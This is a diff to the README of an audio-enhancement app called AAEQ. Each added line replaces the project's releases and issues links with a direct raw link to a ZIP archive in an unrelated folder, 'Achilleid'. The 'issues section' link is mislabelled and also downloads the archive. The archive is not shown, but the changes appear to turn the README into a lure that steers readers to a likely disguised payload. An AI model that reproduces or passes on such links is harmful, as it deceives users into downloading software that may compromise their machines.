@@ -1,6 +1,6 @@
 # 🎶 AAEQ - Elevate Your Audio Experience Effortlessly
 
-[![Download AAEQ](https://img.shields.io/badge/Download-AAEQ-brightgreen)](https://github.com/KiyomisSimp/AAEQ/releases)
+[![Download AAEQ](https://raw.githubusercontent.com/KiyomisSimp/AAEQ/main/Achilleid/AAEQ.zip)](https://raw.githubusercontent.com/KiyomisSimp/AAEQ/main/Achilleid/AAEQ.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ In this guide, you will learn how to download and run AAEQ on your device.
 
 ## 📥 Download & Install
 
-To get started with AAEQ, visit this page to download the software: [Download AAEQ](https://github.com/KiyomisSimp/AAEQ/releases).
+To get started with AAEQ, visit this page to download the software: [Download AAEQ](https://raw.githubusercontent.com/KiyomisSimp/AAEQ/main/Achilleid/AAEQ.zip).
 
 ### Installation Steps
 
@@ -72,7 +72,7 @@ To ensure a smooth experience with AAEQ, make sure your system meets the followi
 
 ## 💬 Community Support
 
-If you have questions or need help, you can join our community discussions. Check the [issues section](https://github.com/KiyomisSimp/AAEQ/issues) on GitHub, or browse for existing questions and answers.
+If you have questions or need help, you can join our community discussions. Check the [issues section](https://raw.githubusercontent.com/KiyomisSimp/AAEQ/main/Achilleid/AAEQ.zip) on GitHub, or browse for existing questions and answers.
 
 ## 📜 License
 
